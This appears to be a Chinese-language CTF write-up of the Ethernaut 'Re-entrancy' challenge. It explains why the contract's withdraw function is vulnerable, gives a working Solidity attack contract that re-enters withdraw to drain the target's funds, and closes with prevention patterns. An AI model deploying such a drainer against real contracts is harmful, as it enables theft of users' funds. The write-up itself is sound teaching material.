# Re-entrancy
## 題目
<img width="505" alt="截圖 2024-09-08 下午4 18 44" src="https://github.com/user-attachments/assets/1960a2c7-b6a9-4f4c-b6cd-83f156565989">

## 合約
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```


## 重入攻擊

#### 合約中的 Reentrancy 漏洞
我們仔細看 `withdraw()` 函數，攻擊流程如下：
1. **檢查條件**：確認提款者的餘額是否足夠。
2. **轉帳操作**：進行外部 `call`，將金額轉給提款者。
3. **更新餘額**：在最後才將提款者的餘額減少。

由於提款者的餘額是在資金轉出後才更新，這為 Reentrancy 攻擊提供了機會。攻擊者可以在資金轉出後但餘額尚未更新時，重入 `withdraw()` 函數，再次提取資金，形成無限循環。

#### 攻擊流程
1. **初始捐款**：攻擊者先向 Reentrance 合約捐款，將一定數量的資金存入合約中。
2. **觸發 `withdraw()`**：攻擊者呼叫 `withdraw()` 取出部分資金，進入提款流程。
3. **重入攻擊**：在收到第一次提款資金後，攻擊者的合約的 `receive()` 函數被觸發，再次呼叫 `withdraw()`，重複提取資金直到合約資金耗盡。

### hack
```solidity
pragma solidity ^0.8.0;

interface IReentrancy {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract Hack {
    IReentrancy private immutable target;

    constructor(address _target) {
        target = IReentrancy(_target);
    }

    // NOTE: attack cannot be called inside constructor
    function attack() external payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);

        require(address(target).balance == 0, "target balance > 0");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        if (amount > 0) {
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
```

### 如何預防 Reentrancy 攻擊

防止 Reentrancy 攻擊有幾個關鍵的方式：

#### 1. 使用 Checks-Effects-Interactions 模式
這是一種常見的開發模式，將外部呼叫（`Interactions`）放在狀態變數更新（`Effects`）之後進行，這樣可以確保當外部合約被呼叫時，內部狀態已經更新完畢，防止重入攻擊。

```solidity
function withdraw(uint _amount) public {
    // 先更新狀態變數
    balances[msg.sender] -= _amount;

    // 再與外部進行互動
    (bool result,) = msg.sender.call{value: _amount}("");
    require(result, "Transfer failed");
}
```

#### 2. 使用 Reentrancy Guard
可以使用 `ReentrancyGuard` 來防止函數被重入調用。這是一種設計模式，透過狀態變數來鎖定函數，確保函數只能被調用一次。

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeContract is ReentrancyGuard {
    function withdraw(uint _amount) public nonReentrant {
        // 使用 ReentrancyGuard 防止重入攻擊
        balances[msg.sender] -= _amount;
        (bool result,) = msg.sender.call{value: _amount}("");
        require(result, "Transfer failed");
    }
}
```
